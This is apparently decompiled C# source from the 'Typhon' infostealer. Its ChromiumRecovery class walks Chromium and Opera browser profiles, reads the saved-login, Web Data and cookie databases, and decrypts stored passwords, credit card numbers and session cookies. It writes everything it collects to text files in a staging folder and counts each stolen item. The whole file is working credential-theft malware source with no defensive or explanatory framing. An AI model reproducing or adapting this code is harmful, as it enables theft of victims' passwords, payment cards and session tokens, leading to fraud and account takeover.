using System;
using System.Collections.Generic;
using System.IO;
using Typhon.Modules.Miscellaneous;

namespace Typhon.Stealer.Software.Browsers.Chromium
{
	// Token: 0x02000026 RID: 38
	internal class ChromiumRecovery
	{
		// Token: 0x0600009E RID: 158 RVA: 0x00006D24 File Offset: 0x00004F24
		public static void SaveData(string saveDir)
		{
			if (!Directory.Exists(saveDir))
			{
				Directory.CreateDirectory(saveDir);
			}
			foreach (string text in Paths.ChromiumPaths)
			{
				string path;
				if (text.Contains("Opera Software"))
				{
					path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + text;
				}
				else
				{
					path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + text;
				}
				if (Directory.Exists(path))
				{
					foreach (string str in Directory.GetDirectories(path))
					{
						List<DataModels.CreditCard> cc = ChromiumRecovery.GetCC(str + "\\Web Data");
						List<DataModels.Password> passwords = ChromiumRecovery.GetPasswords(str + "\\Login Data");
						List<DataModels.Cookie> cookies = ChromiumRecovery.GetCookies(str + "\\Cookies");
						List<DataModels.AutoFill> autoFills = ChromiumRecovery.GetAutoFills(str + "\\Web Data");
						if (!Directory.Exists(saveDir + "\\Credit Cards"))
						{
							Directory.CreateDirectory(saveDir + "\\Credit Cards");
						}
						DataFormatter.WriteCC(cc, saveDir + "\\Credit Cards\\CreditCards_(" + Crypto.BrowserPathToAppName(text) + ").txt");
						DataFormatter.WritePassword(passwords, saveDir + "\\Passwords.txt", Crypto.BrowserPathToAppName(text));
						if (!Directory.Exists(saveDir + "\\Cookies"))
						{
							Directory.CreateDirectory(saveDir + "\\Cookies");
						}
						DataFormatter.WriteCookies(cookies, saveDir + "\\Cookies\\Cookies_(" + Crypto.BrowserPathToAppName(text) + ").txt");
						DataFormatter.WriteImportantAutoFills(autoFills, saveDir + "\\ImportantAutoFills.txt", Crypto.BrowserPathToAppName(text));
						if (!Directory.Exists(saveDir + "\\Autofills"))
						{
							Directory.CreateDirectory(saveDir + "\\Autofills");
						}
						DataFormatter.WriteAutoFills(autoFills, saveDir + "\\Autofills\\AutoFill_(" + Crypto.BrowserPathToAppName(text) + ").txt");
						if (Directory.GetFiles(saveDir + "\\Credit Cards").Length == 0)
						{
							IOHelper.DeleteDirectory(saveDir + "\\Credit Cards", false);
						}
						if (Directory.GetFiles(saveDir + "\\Cookies").Length == 0)
						{
							IOHelper.DeleteDirectory(saveDir + "\\Cookies", false);
						}
						if (Directory.GetFiles(saveDir + "\\Autofills").Length == 0)
						{
							IOHelper.DeleteDirectory(saveDir + "\\Autofills", false);
						}
					}
				}
			}
		}

		// Token: 0x0600009F RID: 159 RVA: 0x00006F64 File Offset: 0x00005164
		public static List<DataModels.CreditCard> GetCC(string sWebData)
		{
			List<DataModels.CreditCard> result;
			try
			{
				List<DataModels.CreditCard> list = new List<DataModels.CreditCard>();
				SQLite sqlite = SqlReader.ReadTable(sWebData, "credit_cards");
				if (sqlite == null)
				{
					result = list;
				}
				else
				{
					for (int i = 0; i < sqlite.GetRowCount(); i++)
					{
						list.Add(new DataModels.CreditCard
						{
							sNumber = Crypto.GetUTF8(Crypto.EasyDecrypt(sWebData, sqlite.GetValue(i, 4))),
							sExpYear = Crypto.GetUTF8(sqlite.GetValue(i, 3)),
							sExpMonth = Crypto.GetUTF8(sqlite.GetValue(i, 2)),
							sName = Crypto.GetUTF8(sqlite.GetValue(i, 1))
						});
						Counter.CC++;
					}
					result = list;
				}
			}
			catch
			{
				result = new List<DataModels.CreditCard>();
			}
			return result;
		}

		// Token: 0x060000A0 RID: 160 RVA: 0x00007030 File Offset: 0x00005230
		public static List<DataModels.Cookie> GetCookies(string sCookie)
		{
			List<DataModels.Cookie> result;
			try
			{
				List<DataModels.Cookie> list = new List<DataModels.Cookie>();
				SQLite sqlite = SqlReader.ReadTable(sCookie, "cookies");
				if (sqlite == null)
				{
					result = list;
				}
				else
				{
					for (int i = 0; i < sqlite.GetRowCount(); i++)
					{
						DataModels.Cookie item = default(DataModels.Cookie);
						item.sValue = Crypto.EasyDecrypt(sCookie, sqlite.GetValue(i, 12));
						if (item.sValue == "")
						{
							item.sValue = sqlite.GetValue(i, 3);
						}
						item.sHostKey = Crypto.GetUTF8(sqlite.GetValue(i, 1));
						item.sName = Crypto.GetUTF8(sqlite.GetValue(i, 2));
						item.sPath = Crypto.GetUTF8(sqlite.GetValue(i, 4));
						item.sExpiresUtc = Crypto.GetUTF8(sqlite.GetValue(i, 5));
						item.sIsSecure = Crypto.GetUTF8(sqlite.GetValue(i, 6).ToUpper());
						list.Add(item);
						Counter.Cookies++;
					}
					result = list;
				}
			}
			catch
			{
				result = new List<DataModels.Cookie>();
			}
			return result;
		}

		// Token: 0x060000A1 RID: 161 RVA: 0x0000714C File Offset: 0x0000534C
		public static List<DataModels.Password> GetPasswords(string sLoginData)
		{
			List<DataModels.Password> result;
			try
			{
				List<DataModels.Password> list = new List<DataModels.Password>();
				SQLite sqlite = SqlReader.ReadTable(sLoginData, "logins");
				if (sqlite == null)
				{
					result = list;
				}
				else
				{
					for (int i = 0; i < sqlite.GetRowCount(); i++)
					{
						DataModels.Password item = default(DataModels.Password);
						item.sUrl = Crypto.GetUTF8(sqlite.GetValue(i, 0));
						item.sUsername = Crypto.GetUTF8(sqlite.GetValue(i, 3));
						string value = sqlite.GetValue(i, 5);
						if (value != null)
						{
							item.sPassword = Crypto.GetUTF8(Crypto.EasyDecrypt(sLoginData, value));
							list.Add(item);
							Counter.Passwords++;
						}
					}
					result = list;
				}
			}
			catch
			{
				result = new List<DataModels.Password>();
			}
			return result;
		}

		// Token: 0x060000A2 RID: 162 RVA: 0x0000720C File Offset: 0x0000540C
		public static List<DataModels.AutoFill> GetAutoFills(string sWebData)
		{
			List<DataModels.AutoFill> result;
			try
			{
				List<DataModels.AutoFill> list = new List<DataModels.AutoFill>();
				SQLite sqlite = SqlReader.ReadTable(sWebData, "autofill");
				if (sqlite == null)
				{
					result = list;
				}
				else
				{
					for (int i = 0; i < sqlite.GetRowCount(); i++)
					{
						list.Add(new DataModels.AutoFill
						{
							sName = Crypto.GetUTF8(sqlite.GetValue(i, 0)),
							sValue = Crypto.GetUTF8(sqlite.GetValue(i, 1))
						});
						Counter.Autofills++;
					}
					result = list;
				}
			}
			catch
			{
				result = new List<DataModels.AutoFill>();
			}
			return result;
		}
	}
}
